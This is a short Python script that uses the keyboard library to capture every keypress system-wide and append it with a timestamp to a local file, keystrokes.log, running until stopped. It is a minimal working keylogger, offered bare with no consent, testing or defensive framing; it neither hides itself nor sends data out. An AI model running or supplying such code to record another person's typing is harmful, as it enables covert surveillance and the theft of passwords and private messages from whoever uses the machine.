import keyboard
import datetime

# Function to write keystrokes to a log file
def log_keystroke(event):
    with open("keystrokes.log", "a") as log_file:
        log_file.write(f"[{datetime.datetime.now()}] Key pressed: {event.name}\n")

# Start logging keystrokes
keyboard.on_press(log_keystroke)

# Keep the script running to continue logging
keyboard.wait()
